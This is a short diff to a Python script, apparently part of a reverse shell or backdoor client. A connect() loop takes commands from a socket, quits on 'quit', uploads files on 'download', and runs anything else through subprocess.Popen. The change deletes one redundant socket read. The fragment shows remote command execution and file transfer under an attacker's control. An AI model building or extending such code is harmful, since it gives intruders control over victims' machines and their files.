@@ -35,7 +35,6 @@ def connect():
                 if received == 'quit':
                     sock.close()
                 elif received == 'download':
-                    sock.recv(received)
                     upload()
                 else:
                     result = subprocess.Popen(received, shell=False, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
